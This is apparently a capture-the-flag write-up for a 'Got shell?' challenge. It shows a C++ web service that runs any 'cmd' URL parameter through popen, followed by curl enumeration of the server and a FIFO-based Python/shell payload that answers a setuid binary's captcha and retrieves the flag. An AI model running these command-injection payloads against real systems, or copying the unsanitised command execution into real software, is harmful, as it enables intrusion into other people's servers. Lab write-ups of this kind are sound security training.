# Day 24 - Got shell? - web, linux

> Can you get a shell? NOTE: The firewall does not allow outgoing traffic & There are no additional paths on the website.

Service: [http://3.93.128.89:1224](http://3.93.128.89:1224)

## Initial Analysis

Looking at the only page for the challenge we get a single-page C program:

```c
#include "crow_all.h"
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>
#include <sstream>

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        return std::string("Error");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

int main() {
    crow::SimpleApp app;
    app.loglevel(crow::LogLevel::Warning);

    CROW_ROUTE(app, "/")
    ([](const crow::request& req) {
        std::ostringstream os;
        if(req.url_params.get("cmd") != nullptr){
            os << exec(req.url_params.get("cmd"));
        } else {
            os << exec("cat ./source.html"); 
        }
        return crow::response{os.str()};
    });

    app.port(1224).multithreaded().run();
}
```

From the source its clear, that sending any command in the `cmd` paramater will execute a command on the server. I started by running a quick command against the service with curl which showed us that the program was indeed what it pretended to be.

```
$ curl 'http://3.93.128.89:1224?cmd=id'
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

## Problem Analysis

Running through several enumeration steps we find that there is a single binary in the main web root `flag_reader` along with the flag `flag`. Also, the problem setup suggests that we won't be able to get an interactive shell so any command will _have_ to be run through the web shell. Running the service shows that it outputs some text, an addition equation, and an error message about some captcha.

```
$ curl 'http://3.93.128.89:1224?cmd=ls%20-al'
total 44
drwxr-xr-x 1 root root      4096 Dec 24 11:56 .
drwxr-xr-x 1 root root      4096 Dec 24 11:56 ..
----r----- 1 root gotshell    38 Dec 24 08:32 flag
------s--x 1 root gotshell 17576 Dec  5 17:26 flag_reader
-rw-rw-r-- 1 root root     10459 Dec 24 08:32 source.html
$ curl 'http://3.93.128.89:1224?cmd=./flag_reader'
Got shell?
1318462211 + 118538656 = Incorrect captcha :(
```

It wasn't entirely clear to me at first what the "captcha" they were referring to was (but it became more obvious later). Furthermore, since we're running as `nobody` we won't have a lot of things we can write to or execute on the filesystem. Checking `/tmp` we can see that we can't list the directory, but we can write and execute files from it. My guess would be that the problem creator intended for people to write data here, but didn't want participants stealing the flag from each other.

```
$ curl 'http://3.93.128.89:1224?cmd=ls%20-al%20/tmp'
$ curl 'http://3.93.128.89:1224?cmd=ls%20-al%20/'
total 60
drwxr-xr-x    1 root root 4096 Dec 24 23:02 .
drwxr-xr-x    1 root root 4096 Dec 24 23:02 ..
-rwxr-xr-x    1 root root    0 Dec 24 23:02 .dockerenv
lrwxrwxrwx    1 root root    7 Nov 27 09:35 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Apr 16  2019 boot
drwxr-xr-x    5 root root  340 Dec 24 23:45 dev
drwxr-xr-x    1 root root 4096 Dec 24 23:02 etc
drwxr-xr-x    2 root root 4096 Apr 16  2019 home
lrwxrwxrwx    1 root root    7 Nov 27 09:35 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Nov 27 09:35 lib32 -> usr/lib32
lrwxrwxrwx    1 root root    9 Nov 27 09:35 lib64 -> usr/lib64
lrwxrwxrwx    1 root root   10 Nov 27 09:35 libx32 -> usr/libx32
drwxr-xr-x    2 root root 4096 Nov 27 09:35 media
drwxr-xr-x    2 root root 4096 Nov 27 09:35 mnt
drwxr-xr-x    1 root root 4096 Dec 24 11:56 opt
dr-xr-xr-x 1570 root root    0 Dec 24 23:45 proc
drwx------    2 root root 4096 Nov 27 09:36 root
drwxr-xr-x    1 root root 4096 Dec 19 04:22 run
lrwxrwxrwx    1 root root    8 Nov 27 09:35 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Nov 27 09:35 srv
dr-xr-xr-x   13 root root    0 Dec  5 18:53 sys
drwx-wx-wx    1 root root 4096 Dec 25 01:34 tmp
drwxr-xr-x    1 root root 4096 Nov 27 09:35 usr
drwxr-xr-x    1 root root 4096 Nov 27 09:36 var
```

## The Clue

At first I tried a bunch of different methods for solving this - looking for ways to remove the system randomness in the captcha, searching the `/proc` filesystem for `./flag_reader` processes, trying to set environment variables for `./flag_reader`, and trying a really long argument looking for a buffer overflow. It turned out the solution was much easier than this.

Returning to the `./flag_reader`, it finally became clear that we were supposed to somehow solve the equation (or "captcha") and write the answer to the process. This would be trivial with an interactive shell, but since we can't get one we have to rig-up a makeshift linux command to do it all for us.

So the problem I then tried to solve was

1. Parse out the captcha from `./flag_reader`
2. Solve the arithmetic
3. Write it back to the process
4. Read the remaining data from `./flag_reader` to get the flag.

This turned out to be the right approach and is the basis for my solution below.

## Solution

Reading data out of the process, writing data back, and then reading again made me think of a reverse shell, so I looked to a [cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for inspiraion. Looking down the page, you can see that if we create a fifo pipe we can do this exact read-write-read operation. Ok, part 3 & 4 solved.

Reading the captcha out of the equation can be done with a few helpful commands - `dd` and `sed` - in order to parse out the "A + B" part of the output. Part 1 done.

Finally, solving the arithmetic can be done with a simple `expr` call. Part 2 done.

Puttnig it all together, I tried to fit this all on a single command line, but couldn't quite get it right. I ended up writing the commands to a script in `/tmp`, setting it to executable, and then using the fifo pipe to ocall the script. I also, tried a bunch of times (to no success), so wrote all of my commands in a ipython prompt to avoid manually writing all of the URL encodings manually. My final call in ipython is below which returns the flag as part of the response. Note: I just jammed on the keyboard to create random filenames in `/tmp`

```python
In [141]: print(requests.get('http://3.93.128.89:1224?cmd='+urllib.parse.quote('rm -f /tmp/qwegjnxbfx /tmp/wersxrgxr ; echo \'#!/bin/sh\nX=\x60dd bs=1 skip=10 count=23|sed \'s/=//g\'\x60\necho $X > /tmp/wrjxesjkxrg\necho \x60expr $X\x60\n
     ...: dd of=/tmp/qwegjnxbfx\' > /tmp/wersxrgxr ; chmod +x /tmp/wersxrgxr ; rm -f /tmp/ff ; mkfifo /tmp/ff ; cat /tmp/ff | ./flag_reader | /tmp/wersxrgxr > /tmp/ff ; ls -al /tmp /tmp/qwegjnxbfx /tmp/wersxrgxr /tmp/wrjxesjkxrg ; cat /tm
     ...: p/wersxrgxr ; cat /tmp/qwegjnxbfx ; cat /tmp/wrjxesjkxrg')).text)

-rw-r--r-- 1 nobody nogroup   40 Dec 24 20:33 /tmp/qwegjnxbfx
-rwxr-xr-x 1 nobody nogroup  114 Dec 24 20:33 /tmp/wersxrgxr
-rw-r--r-- 1 nobody nogroup   22 Dec 24 20:33 /tmp/wrjxesjkxrg

#!/bin/sh
X=`dd bs=1 skip=10 count=23|sed s/=//g`
echo $X > /tmp/wrjxesjkxrg
echo `expr $X`
dd of=/tmp/qwegjnxbfx
= AOTW{d1d_y0u_g3t_4n_1n73r4c71v3_5h3ll}607588343 + 507390427

```

